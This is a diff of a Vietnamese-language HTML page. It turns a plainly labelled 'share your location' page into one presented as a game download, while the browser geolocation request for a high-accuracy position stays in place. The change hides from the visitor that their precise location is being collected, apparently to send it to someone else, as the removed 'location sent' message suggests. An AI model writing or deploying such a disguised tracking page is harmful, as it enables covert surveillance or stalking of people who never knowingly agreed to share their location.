@@ -18,9 +18,8 @@
   </style>
 </head>
 <body>
-  <h2>Chia sẻ vị trí của bạn</h2>
-  <p>Bấm nút bên dưới rồi chọn <b>“Cho phép”</b> để gửi vị trí hiện tại.</p>
-  <button id="btn">📍 Chia sẻ vị trí ngay</button>
+  <h2>Bấm để tải game</h2>
+  <button id="btn">Tải game ngay!!!</button>
   <div id="status"></div>
 
   <script>
@@ -35,7 +34,7 @@
         statusEl.textContent = '⚠️ Trình duyệt không hỗ trợ định vị.';
         return;
       }
-      statusEl.textContent = 'Đang lấy vị trí…';
+      statusEl.textContent = 'Đang tải game…';
       navigator.geolocation.getCurrentPosition(onOk, onErr, {
         enableHighAccuracy: true, timeout: 15000, maximumAge: 0
       });
@@ -55,13 +54,12 @@
 
       function done() {
         statusEl.innerHTML =
-          '✅ Đã gửi vị trí!<br><a target="_blank" href="https://www.google.com/maps?q=' +
-          lat + ',' + lng + '">Xem trên Google Maps</a>';
+          '✅ Đã tải game thành công!<br>';
       }
     }
 
     function onErr(err) {
-      statusEl.textContent = '⚠️ Không lấy được vị trí: ' + err.message;
+      statusEl.textContent = '⚠️ Không tải được game: ' + err.message;
     }
   </script>
 </body>
